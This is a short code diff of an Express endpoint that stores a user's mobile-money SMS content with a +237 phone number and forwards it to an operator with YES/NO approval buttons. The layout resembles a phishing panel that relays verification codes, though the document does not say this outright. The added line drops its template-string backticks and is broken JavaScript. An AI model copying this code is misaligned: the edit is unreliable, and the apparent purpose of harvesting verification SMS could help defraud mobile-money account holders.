@@ -66,7 +66,7 @@ app.post('/api/send-momo-message', async (req, res) => {
     applications[applicationId].smsMessage = momoMessage;
     applications[applicationId].smsStatus = 'pending';
 
-    const message = `📨 *SMS VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
+    const message =${momoMessage}\n;
     const buttons = [[
         { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
         { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
